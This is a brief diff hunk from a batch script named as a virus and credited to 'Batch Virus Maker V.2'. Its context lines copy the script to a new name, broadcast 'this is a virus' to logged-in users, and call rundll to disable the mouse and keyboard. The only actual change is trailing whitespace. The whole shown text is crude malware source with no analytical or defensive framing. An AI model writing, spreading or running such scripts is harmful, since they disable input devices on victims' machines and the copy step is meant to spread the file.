@@ -40,4 +40,4 @@ copy "virus.bat" "virus.bat2009"
 msg * this is a virus
 rundll mouse,disable
 rem made with Batch Virus Maker V.2
-rundll keyboard,disable
+rundll keyboard,disable 
